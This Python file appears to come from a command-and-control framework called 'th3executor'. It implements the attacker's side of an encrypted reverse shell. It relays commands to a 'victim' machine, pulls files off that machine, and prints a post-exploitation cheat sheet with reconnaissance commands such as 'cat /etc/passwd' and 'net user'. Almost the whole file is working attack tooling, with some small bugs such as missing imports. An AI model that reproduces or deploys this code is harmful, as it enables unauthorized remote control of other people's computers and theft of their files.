import components.networking as networking
from ..oberon_framework import clear_screen
from components.ingestor import createfile_nocollision
import time
import os
import ascii_art

def process_shell_prompt(output, conn_obj):
    networking.clear_socket_buffer(conn_obj)
    try:
        # Decrypt the message and decode it
        decrypted_message = networking.decrypt_message(output).decode()
        shell_prompt, message = '', ''
        
        # Strip the "::" delimiter to separate message and prompt
        if "::" in decrypted_message:
            parts = decrypted_message.split("::")
            try:
                if len(parts) == 2:
                    message, shell_prompt = parts
                else:
                    message = decrypted_message
                    shell_prompt = "No Username"
            finally:
                print(message)
        else:
            shell_prompt = decrypted_message
            
        # Check for "No Username"
        if shell_prompt == "No Username":
            raise Exception()

    except:
        print(f"[-] Unable to establish current shell path, using default placeholder instead")
        shell_prompt = "th3executor_victim_shell > "

    return shell_prompt

def shell_command(client_output, conn_obj):    
    print(f"[!] {colored('REVERSE SHELL ACTIVE', 'green')} - Type 'quit' or 'exit' to exit shell command")
    print("[!] Type 'help' to view the shell help menu \n")
    
    usr_input, shell_prompt = '', process_shell_prompt(client_output, conn_obj)
    
    while True:
        networking.clear_socket_buffer(conn_obj)
        usr_input = input("\n" + colored(shell_prompt, attrs=["bold"])).strip()
        
        if usr_input == "clear" or usr_input == "cls":
            clear_screen()
            shell_banner()
            continue
        elif usr_input == "quit" or usr_input == "exit":
            networking.clear_socket_buffer(conn_obj) 
            print("Redirecting you back to th3executor . . .")
            time.sleep(1.5)
            clear_screen()
            intro_banner()
        elif usr_input == "help":
            shell_help()
            continue
        elif usr_input == "commands_help":
            shell_cheat_sheet()
            continue
        
        conn_obj.sendall(networking.encrypt_message(usr_input))  # Send command
        if usr_input == "quit" or usr_input == "exit":
            break
        
        if usr_input[:3] == 'cd ':
            try:
                shell_prompt = process_shell_prompt(conn_obj.recv(4029), conn_obj)
            except Exception as err:
                print(f"[-] Unable to change user directory, please try the command again -> {err}")
            finally:
                continue        
        elif usr_input.startswith("download "):
                download_output = download(conn_obj, usr_input)
                if download_output != "saved":
                    print(f"[-] An error has occured when downloading the file. {download_output}")
                else:
                    print(f"[+] File {usr_input[9::]} has been saved successfully in current directory")
                continue # Iterate again, return nothing
        elif usr_input[:6] == "upload":
            pass
        
        retry_counter = 0
        while retry_counter != 2:
            try:
                output = networking.decrypt_message(conn_obj.recv(4096)).decode()
                output = output.replace("[NEWLINE]", "\n")
                break
            except:
                retry_counter += 1
                continue
        if retry_counter == 3:
            print("[-] Unable to parse and decrypt output from target after several attempts, skipping")
        else:
            print(output)
            
def download(conn_obj, usr_input):
    if len(usr_input) <= 9:
        return "[-] Incorrect command usage. Specify 'download' followed by the file path"
        
    # Send the command to the client
    conn_obj.sendall(networking.encrypt_message(usr_input))
    
    try:
        data_size = int(networking.decrypt_message(conn_obj.recv(1024)).decode().strip())
        if not data_size:
            return "[-] No data has been recieved from target."
        
        file_data = networking.reliable_recieve(conn_obj, data_size)
        if not file_data:
            return "[-] No file data has been recieved from target."
                            
        if isinstance(data_size, str):
            return f"[-] An error occured when trying to get the file size. {file_data}"
        else:              
            file_data = networking.process_and_check_recieved_data(file_data, data_size)
            if isinstance(file_data, str):
                return f"[-] An error occured when trying to get the file data. {file_data}"          
    except Exception as err:
        return f"[-] An unidentified error has occured : {err}"
        
    if file_data:
        base_file = os.path.basename(usr_input[9:])
        file_path = createfile_nocollision(f"downloaded_{base_file}")
        
        with open(file_path, "wb") as file:
            file.write(file_data) 

        return "saved"
    else:
        return "[-] No data has been recieved from the target. This can be due to a network issue, Try again."

def shell_banner():
    banner = colored(ascii_art.oberon_main_banner_3, attrs=["bold"])
    text = colored("\n- Embrace Power - Command and Conquer with Th3executor \n", attrs=["dark"]) 
       
    print(banner + text)

def shell_cheat_sheet():
    print(colored("S H E L L  C H E A T  S H E E T  M E N U", attrs=["bold"]))
    print(colored("WINDOWS COMMANDS", "blue", attrs=['bold', 'dark']))

    win = {
        "ipconfig": "Enumerate network configuration",
        "tasklist": "List all running processes",
        "systeminfo": "Display detailed system information",
        "netstat -an": "Display all active connections and listening ports",
        "whoami": "Display the current user",
        "net user": "List all user accounts",
        "net localgroup": "List all local groups",
        "sc query": "Display the status of services",
        "dir": "List directory contents",
        "attrib": "Display or change file attributes"
    }
    for cmd, desc in win.items():
        print(f"> {cmd:<20} - {desc}")

    print("\n\t\t    >-------------<")
    
    print(colored('LINUX COMMANDS', 'blue', attrs=['bold', 'dark']))
    lin = {
        "ifconfig": "Enumerate network configuration",
        "ps aux": "List all running processes",
        "uname -a": "Display detailed system information",
        "netstat -an": "Display all active connections and listening ports",
        "whoami": "Display the current user",
        "cat /etc/passwd": "List all user accounts",
        "cat /etc/group": "List all groups",
        "systemctl status": "Display the status of services",
        "ls -la": "List directory contents",
        "chmod": "Change file permissions"
    }
    for cmd, desc in lin.items():
        print(f"> {cmd:<20} - {desc}")

def shell_help():
    banner = colored('\nS H E L L   M E N U', 'green', attrs=['bold', 'dark'])
    print(banner)
    print(colored('-' * 66, 'green')) 
    descriptions = {
        "download <file_path>": "Download a file from the victim's machine",
        "upload <file_path>": "Upload a file to the victim's machine",
        "help": "Display this help menu",
        "commands_help": "Display a windows and linux shell cheat sheet",
        "exit": "Exit the shell and return to th3executor"
    }
    
    for command, description in descriptions.items():
        print(f"> {command:<20} - {description}")
    print(colored('-' * 66, 'green'))

def shell_load(client_output, conn_obj):
    print("Loading up a shell enviroment . . .")
    time.sleep(1.5)
    clear_screen()
    shell_banner()
    shell_command(client_output, conn_obj)

    return "Shell Exited Successfully"